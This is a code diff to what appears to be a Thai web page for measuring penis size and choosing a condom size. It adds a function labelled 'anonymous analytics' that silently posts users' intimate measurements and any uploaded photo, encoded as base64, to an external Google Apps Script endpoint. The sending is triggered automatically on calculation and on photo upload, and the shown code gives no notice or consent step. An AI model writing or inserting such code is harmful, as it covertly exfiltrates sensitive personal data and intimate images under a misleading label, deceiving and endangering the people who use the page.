@@ -2289,6 +2289,84 @@
     let currentRegion = 'thai';
     let currentTheme = 'light';
 
+    // ============================================================
+    // ANONYMOUS ANALYTICS WEBHOOK INTEGRATION (SESSION UPSERT)
+    // ============================================================
+    const ANALYTICS_URL = "https://script.google.com/macros/s/AKfycbyWXF1m27L--GD3GJz_5nAxx9Q9Ev_hl6VGgDA7wmeR32Jduf75u1zo3u7Mnxvn4E6w/exec";
+    const _sessionId = 'm_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+    let _analyticsTimer = null;
+    let _lastSentSignature = '';
+    let _lastSentTime = 0;
+
+    function sendAnonymousAnalytics(force = false, delay = 3000) {
+      clearTimeout(_analyticsTimer);
+      _analyticsTimer = setTimeout(() => {
+        try {
+          let scaleToMm = currentUnit === 'cm' ? 10 : (currentUnit === 'in' ? 25.4 : 1);
+          let l_flaccid = (parseFloat(document.getElementById('l_flaccid')?.value) || 1) * scaleToMm;
+          let g_flaccid = (parseFloat(document.getElementById('g_flaccid')?.value) || 1) * scaleToMm;
+          let l_erect = (parseFloat(document.getElementById('l_erect')?.value) || 1) * scaleToMm;
+          let g_erect = (parseFloat(document.getElementById('g_erect')?.value) || 1) * scaleToMm;
+          let t_fat = (parseFloat(document.getElementById('t_fat')?.value) || 0) * scaleToMm;
+
+          let w_condom = g_erect / 2.3;
+          let standardSizes = [49, 52, 54, 56, 58, 60, 64, 69, 72];
+          let bestSize = standardSizes.reduce((prev, curr) => Math.abs(curr - w_condom) < Math.abs(prev - w_condom) ? curr : prev);
+
+          let r_erect = g_erect / (2 * Math.PI);
+          let v_erect = Math.PI * r_erect * r_erect * l_erect / 1000;
+          let bfpi = (l_erect * g_erect) / (l_flaccid * g_flaccid || 1);
+
+          let photoImg = document.getElementById('passportImgView');
+          let photoBase64 = "";
+          if (_userPhotoUploaded && photoImg && photoImg.src && photoImg.src.startsWith('data:image')) {
+            photoBase64 = photoImg.src;
+          }
+
+          let archTitleElem = document.getElementById('resArchetypeTitle');
+          let archName = archTitleElem ? archTitleElem.innerText.trim() : '';
+
+          const payload = {
+            mode: 'male',
+            sessionId: _sessionId,
+            erectLength: l_erect.toFixed(1),
+            erectGirth: g_erect.toFixed(1),
+            flaccidLength: l_flaccid.toFixed(1),
+            flaccidGirth: g_flaccid.toFixed(1),
+            fat: t_fat.toFixed(1),
+            condomSize: bestSize,
+            bfpiType: bfpi < 1.8 ? 'ควยเนื้อ' : (bfpi >= 2.5 ? 'ควยเลือด' : 'Hybrid'),
+            archetype: archName,
+            bloodVolume: v_erect.toFixed(1),
+            vaginalResting: '',
+            vaginalExpanded: '',
+            labiaAsym: '',
+            cervicalImpact: '',
+            score: '',
+            photoBase64: photoBase64
+          };
+
+          const now = Date.now();
+          const signature = `male_${l_erect.toFixed(1)}_${g_erect.toFixed(1)}_${l_flaccid.toFixed(1)}_${g_flaccid.toFixed(1)}_${t_fat.toFixed(1)}_${Boolean(photoBase64)}_${photoBase64 ? photoBase64.length : 0}`;
+          if (_lastSentSignature === signature && (now - _lastSentTime) < 60000) {
+            console.log('⏳ Duplicate signature detected within 60s, skipping sync.');
+            return;
+          }
+          _lastSentSignature = signature;
+          _lastSentTime = now;
+
+          fetch(ANALYTICS_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            body: JSON.stringify(payload)
+          }).then(() => console.log('✅ Male Analytics logged to Google Sheet')).catch(e => console.warn('Analytics log notice:', e));
+        } catch(e) {
+          console.warn('sendAnonymousAnalytics error:', e);
+        }
+      }, force ? (delay || 100) : 3500);
+    }
+
     // ACCURATE NORMAL CUMULATIVE DISTRIBUTION FUNCTION (CDF)
     function normalCDF(z) {
       let t = 1 / (1 + 0.2316419 * Math.abs(z));
@@ -2538,6 +2616,9 @@
       if (triggerCalculate) {
         calculate();
         triggerPulseAnimation();
+        if (typeof sendAnonymousAnalytics === 'function') {
+          sendAnonymousAnalytics(true, 500);
+        }
       }
 
       window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -2966,6 +3047,9 @@
           exportImg.src = e.target.result;
           _userPhotoUploaded = true;
           showToast('📸 อัปโหลดรูปภาพเรียบร้อย!');
+          if (typeof sendAnonymousAnalytics === 'function') {
+            sendAnonymousAnalytics(true, 300);
+          }
         };
         reader.readAsDataURL(input.files[0]);
       }
